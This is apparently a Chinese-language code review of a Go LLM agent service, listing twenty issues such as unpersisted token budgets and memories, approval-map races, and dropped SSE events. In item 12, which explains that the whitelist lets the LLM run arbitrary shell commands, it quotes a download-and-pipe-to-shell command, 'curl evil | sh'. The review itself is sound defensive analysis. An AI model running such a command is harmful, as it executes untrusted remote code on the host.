高优先级（功能 silent break / 状态丢失）

  1. TokenBudget 是 dead field — API 入口与 SQL 持久化双双漏掉

  - types.Task.TokenBudget 存在，但：
    - api.CreateTaskRequest (handler.go:34-40) 不接收
    - SQLiteStore 表 schema / SaveTask / GetTask 都没有 token_budget 列（sqlite.go:46-56, 102-117, 254-265）
    - postgres / redis 同样
  - 后果：任务 TokenBudget 永远为 0，engine.go:160 和 multiagent/coordinator.go:547-556 的"TokenBudget > 0"分支永远 false。所有 token 预算 gate
  形同虚设。最近 commit "Token 预算只在研究阶段 gate（可能超预算）"修了 multiagent 的分布问题，但根因在更前面。
  - 建议：在 CreateTaskRequest 加字段、在 sqlite/postgres schema 加列并迁移（ALTER TABLE ADD COLUMN token_budget INTEGER NOT NULL DEFAULT 0）。

  2. task.Memories 在所有 SQL store 中完全不持久化

  - SQLiteStore.SaveTask (sqlite.go:102) 不写 Memories；GetTask (sqlite.go:254) 不读。
  - MemoryStore (in-memory) 通过 clone 保留，但任何持久化 store 都丢。
  - 后果：跨进程恢复（例如 awaiting_approval 后服务器重启再继续）或多副本部署时，RAG 记忆都丢；同时 Engine.Next (engine.go:86) 又用 len(task.Memories) ==
  0 决定是否重新拉取——重启后会重新调用一次 embedding API + RAG search，浪费成本且与"长期记忆已注入"的语义不符。
  - 建议：要么把 Memories 序列化为 JSON 列存进 tasks 表，要么显式约定 "Memories 不持久化、每次启动重拉"，并把 RAG prefetch 条件改成"task.Memories ==
  nil"以区分"没拉过"与"拉过但为空"。

  3. ValidateDecision 与工具注册表脱节（违反三方不变量）

  internal/planner/validate.go:37-52 的 switch 只覆盖 find_files / search_text / read_file / write_file / execute_code / none。新工具 git_diff /
  http_fetch / web_search / use_skill 全部走 default 分支，没有参数校验。
  - 后果：LLM 返回 {"action":"http_fetch","parameters":{}} 验证通过，再由工具自己抛 "url parameter is required"——错误延迟到执行阶段，浪费一次 plan-execute
   循环。
  - README/CLAUDE.md 明文要求"三方不变量"，这里实际已经破坏。
  - 建议：要么补齐 switch case，要么改成 "如果 tool 实现 Validator 接口（参考 use_skill.go:49），就调它"，让校验也从注册表派生。

  4. Gemini provider 绕过了 providerRegistry

  planner/llm.go:124-213 用 if provider == ProviderGemini 特判走 SDK 路径，而 providerRegistry 只包含 openai-responses / openai / ollama。
  - 后果："LLM Provider 是 pluggable"的设计承诺只对 HTTP 类提供方成立；想替换 Gemini 实现（比如换 base URL、加日志、加重试）必须改 llm.go 主流程。
  - 建议：把 Gemini 包成一个实现 LLMProvider 的 struct，或者明确接口允许"非 HTTP-based provider"。这种特判每加一个 SDK 类 provider 就会扩散一次。

  🟠 中优先级（可观测性 / 资源泄漏）

  5. approval 全局 map 用 task ID 作 key — 同任务连续高风险动作会互踩

  orchestrator/approval.go:23 approvals[taskID] = entry。如果一个 task 的某个 step 触发 approval，主流程开始等待，期间另一条路径（极端：multiagent batch
  的 serial step）再触发 RegisterApproval(taskID, ...)，直接覆盖原 entry。旧 entry 的 ch 没人发送、没人 close，原 goroutine 永远阻塞在
  <-ch（engine.go:306）。
  - 即便不触发，也存在跨副本"approval 黑洞"——approvals 是进程级，多副本时其他副本完全看不到 awaiting_approval。
  - 建议：key 加 step 序号或一个 approval UUID；多副本场景至少把 pending approval 写一行进 store，由 /approve 路由按 UUID resolve。

  6. Gemini client pool 无淘汰、无上限

  planner/gemini_pool.go:13 geminiClients = make(map[string]*genai.Client)，key = apiKey|baseURL。配合 config.Reload 设计支持 API key
  轮换——每轮换一次新增一条且旧 client 永远不释放。
  - 后果：长跑服务的内存随 key 轮换次数线性增长。
  - 建议：换 LRU + size cap；或把旧 key 的 entry 在 reload diff 检测到 key 变化时主动剔除。

  7. runAll 的 10 分钟硬超时 + sem 阻塞回滚缺失

  handler.go:245 context.WithTimeout(context.Background(), 10*time.Minute)。
  - multiagent 模式（plan + N 次 research + 多次 LLM 调用）+ 偶发审批等待，10 分钟很容易超。
  - 且 sem 阻塞超时分支（line 276-287）会把 task 直接标 failed("task canceled: ...")——但前面已经把 status 原子转成 running（line
  232）。"从未真正开始的任务"被标 failed，运维侧不可区分。
  - 建议：超时改可配置 (orchestrator.run_all_timeout)；sem 拿不到时把 status 回滚到 created 让客户端重试。

  8. EventBus 慢消费者丢事件 + 终态依赖 15s 轮询补救

  api/sse.go:73-79 Publish 在 buffer 满时 default: 丢弃。runAll 完成时 publish 终态事件用的是同一个 32 缓冲的 channel，而 Engine.RunAll 内部循环还在持续
  publish step / token 事件——大概率在终态前就把 buffer 占满，终态被 drop，最坏要等 15s 轮询 fallback 才送达。
  - 建议：给"终态事件"专门一个非阻塞 sticky 写法（每个订阅者维护一个 latestTerminal atomic.Pointer[StepEvent]，订阅 loop 同时监听 channel 和 terminal
  pointer）；或者把 channel buffer 拆成 step buffer + 1 个 sticky slot。

  9. Engine.SuspendForApproval 用调用方 ctx 持久化 awaiting_approval

  engine.go:294 e.Store.SaveFullTask(ctx, task)：传入的 ctx 是用户 HTTP 请求的 ctx；当用户主动取消或网络中断，状态可能没落盘就开始等审批
  channel——审批永远来不了，状态也回不去。
  - 建议：审批前的"挂起状态"持久化用 context.Background() + 短 timeout，跟 sse.go 的 saveCtx 一个模式。

  🟡 设计/性能（非紧急）

  10. SQLiteStore.QueryMemories 静默截断到 200 条

  queryCandidateLimit = 200，超过 200 条记忆后，老记忆永远不会进入候选集——不是降级排序，是完全消失。
  - 建议：要么改 SQLite FTS / sqlite-vec 等向量插件，要么把候选数做成可配置、并在日志里 warn "candidate limit reached"。

  11. Engine.runEinoNext / runStepNext 不检查 TokenBudget

  即便 #1 修了，eino.go:136 和 step.go:23 的 gate 也只看 StepCount + ToolBudget，没看 token。和 legacy 一致性差。最近 commit 已经修了 multiagent，但 eino
  是默认模式。
  - 建议：把 token gate 抽到 Engine.Next 入口的通用预检。

  12. tools/runner.go:RunCommand 允许 bash -c '...' 等 shell 任意命令

  policy.ValidateCommand 只白名单可执行文件名；bash / sh 在白名单里，配合 args = strings.Fields(argsStr) 会把 -c 'curl evil | sh' 拆成 token 后再交给
  exec。即便走审批，这等于把整个 shell 暴露给 LLM。
  - 建议：要么把 bash/sh 从默认白名单移除（只对脚本路径放行），要么对 -c / -l 这类直接执行字符串的 flag 在 ValidateCommand 之外加二级校验。

  13. HttpFetchTool.Execute 用自建 http.Client 覆盖了配置项

  http_fetch.go:47 &http.Client{Timeout: 15 * time.Second} 与 tool.timeout_seconds（默认 120s）冲突。运维调高配置不会影响 http_fetch，是个隐藏行为。
  - 建议：用 toolTimeout() 派生 client timeout，或在文档里说明 http_fetch 不受 tool 全局超时影响。

  14. MemoryStore.SaveFullTask 每次 completed 都触发 embedding API

  memory.go:50-72 任务一旦 completed，无条件异步重新生成 embedding。如果 SaveFullTask 被多次调用（runAll 的 SaveFullTask + 终态 SaveFullTask + SSE
  callback 触发的额外保存），会反复打 embedding API，每次都是 30s 超时的网络调用。
  - 建议：用 task.ID 做幂等键，indexing 前查一下 m.memories[mem.ID] 是否已存在 + embedding 非空。

  15. isReadOnlyAction 仍保留硬编码白名单

  multiagent/coordinator.go:298-307 现在已经在前面叠加了 RiskLevel 检查（安全侧已收口），但白名单本身还在——以后新加 low-risk
  工具忘了加进白名单，会被错误地强制走 serial 路径（性能退化但无审计痕迹）。
  - 建议：直接 return tool.RiskLevel() == types.RiskLevelLow && !mutatesWorkspace，或在 Tool 接口上加 IsReadOnly()。

  16. config.Reload 的 diff 漏 Embedding.Model

  config.go:221-271 的 diffConfigs 涵盖了 llm/store/orchestrator/rag/tool/log/skill，但漏了 Embedding.Model。运维改了 embedding 模型后看不到 diff 确认。
  - 建议：补一行 addIf("embedding.model", old.Embedding.Model, new.Embedding.Model)。

  17. config.Watch 没有去抖

  fsnotify 在多数编辑器的 "atomic save" 下会触发两次（write + rename）；某些情况下会读到正在写一半的 YAML。Viper 内置 watcher 不去抖。
  - 建议：包一层 200ms 的 debounce timer 再 Reload()。

  18. memory.GetEmbedding 用 flag.Lookup("test.v") 探测测试态

  memory/embed.go:45 用 testing flag 旁路真实 API。这是一种 anti-pattern：在 go run 启动但 import 链里间接拉了 testing
  包时同样会触发；同时让测试无法覆盖真实 API 路径。
  - 建议：注入一个 EmbeddingClient interface，测试时换成 stub。

  19. Engine.RunAll + 长尾 trace 让 GetTask 越跑越慢

  sqlite.go:281-303 GetTask 一次拉全部 trace；任务跑几百步后单次查询 ~MB 级 JSON 反序列化。SSE 兜底每 15s 调一次 GetTask，越后期越贵。
  - 建议：GetTask 给 trace 加分页/最近 N 步；要全量另开 GetTaskFull。

  20. 观察工具：终止原因不可区分

  engine.go:170 agent.task.final_reason="budget_or_max_steps" 把三个不同终止条件合并成一个 attribute，debug 时分不清是哪一种。
  - 建议：拆成 budget_exhausted / max_steps / token_budget / planner_stop 四个值。
